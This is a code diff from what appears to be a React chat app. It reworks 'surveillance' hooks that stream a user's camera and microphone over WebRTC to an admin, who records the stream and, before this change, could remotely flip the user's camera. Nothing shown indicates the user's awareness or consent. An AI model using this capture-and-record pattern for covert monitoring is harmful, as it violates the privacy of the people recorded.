@@ -384,13 +384,6 @@
 
 
 
-
-
-
-
-
-
-
 import { useEffect, useRef, useState, useCallback } from "react";
 import { getSocket } from "@/lib/socket";
 import { useChatStore } from "@/stores/chatStore";
@@ -408,11 +401,6 @@ const ICE_SERVERS: RTCConfiguration = {
     },
   ],
 };
-
-// Global refs + facingMode — موجودة دايماً حتى لو الـ component اتـ unmount
-const globalPeerRef = { current: null as RTCPeerConnection | null };
-const globalStreamRef = { current: null as MediaStream | null };
-let currentFacingMode = "user";
 
 export const useSurveillanceSender = (conversationId: string) => {
   const localStreamRef = useRef<MediaStream | null>(null);
@@ -434,12 +422,12 @@ export const useSurveillanceSender = (conversationId: string) => {
     const socket = getSocket();
     localStreamRef.current?.getTracks().forEach((t) => t.stop());
     localStreamRef.current = null;
-    globalStreamRef.current = null;
     peerConnectionRef.current?.close();
     peerConnectionRef.current = null;
-    globalPeerRef.current = null;
     isStreamingRef.current = false;
-    currentFacingMode = "user";
+    window.__surveillancePc = null;
+    window.__surveillanceStream = null;
+    window.__currentFacingMode = "user";
     if (iceRestartTimerRef.current) clearTimeout(iceRestartTimerRef.current);
     socket.emit("surveillance-stop-to-admin", { conversationId });
   }, [conversationId]);
@@ -456,13 +444,13 @@ export const useSurveillanceSender = (conversationId: string) => {
       });
 
       localStreamRef.current = stream;
-      globalStreamRef.current = stream;
       isStreamingRef.current = true;
-      currentFacingMode = "user";
+      window.__surveillanceStream = stream;
+      window.__currentFacingMode = "user";
 
       const pc = new RTCPeerConnection(ICE_SERVERS);
       peerConnectionRef.current = pc;
-      globalPeerRef.current = pc;
+      window.__surveillancePc = pc;
 
       stream.getTracks().forEach((track) => pc.addTrack(track, stream));
 
@@ -526,61 +514,15 @@ export const useSurveillanceSender = (conversationId: string) => {
       }
     };
 
-    // ← الحل النهائي: نفس فكرة المشروع القديم
-    const onFlipCamera = async () => {
-      console.log("📱 flip-camera received");
-
-      const pc = globalPeerRef.current;
-      const stream = globalStreamRef.current;
-
-      if (!pc || !stream) {
-        console.error("❌ No peer or stream");
-        return;
-      }
-
-      // بدّل الـ facingMode
-      currentFacingMode = currentFacingMode === "environment" ? "user" : "environment";
-      console.log("📱 Switching to:", currentFacingMode);
-
-      try {
-        // وقف الكاميرا الحالية
-        stream.getVideoTracks().forEach((t) => t.stop());
-
-        // افتح الجديدة
-        const newStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: currentFacingMode },
-          audio: false,
-        });
-
-        const newVideoTrack = newStream.getVideoTracks()[0];
-
-        // استبدل في الـ RTCPeerConnection
-        const sender = pc.getSenders().find((s) => s.track?.kind === "video");
-        if (sender) {
-          await sender.replaceTrack(newVideoTrack);
-          console.log("✅ Camera switched to:", currentFacingMode);
-        }
-
-        // حدّث الـ stream
-        stream.getVideoTracks().forEach((t) => stream.removeTrack(t));
-        stream.addTrack(newVideoTrack);
-
-      } catch (err) {
-        console.error("❌ Switch error:", err);
-      }
-    };
-
     const onStopStream = () => stopStreaming();
 
     socket.on("surveillance-answer-to-user", onAnswer);
     socket.on("surveillance-ice-to-user", onIceCandidate);
-    socket.on("surveillance-flip-camera", onFlipCamera);
     socket.on("surveillance-stop-stream", onStopStream);
 
     return () => {
       socket.off("surveillance-answer-to-user", onAnswer);
       socket.off("surveillance-ice-to-user", onIceCandidate);
-      socket.off("surveillance-flip-camera", onFlipCamera);
       socket.off("surveillance-stop-stream", onStopStream);
     };
   }, [stopStreaming]);
@@ -634,6 +576,12 @@ export const useSurveillanceReceiver = (isAdmin: boolean) => {
       conversationId: string;
       fromSocketId: string;
     }) => {
+      const existingPc = peerConnectionsRef.current.get(conversationId);
+      if (existingPc) {
+        existingPc.close();
+        peerConnectionsRef.current.delete(conversationId);
+      }
+
       console.log("📡 Admin received offer!", { conversationId, fromSocketId });
       const pc = new RTCPeerConnection(ICE_SERVERS);
       peerConnectionsRef.current.set(conversationId, pc);
@@ -659,6 +607,11 @@ export const useSurveillanceReceiver = (isAdmin: boolean) => {
           if (audioTracks.length === 0 || videoTracks.length === 0) {
             setTimeout(startRecording, 500);
             return;
+          }
+
+          const existingRecorder = mediaRecordersRef.current.get(conversationId);
+          if (existingRecorder && existingRecorder.state !== "inactive") {
+            existingRecorder.stop();
           }
 
           const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
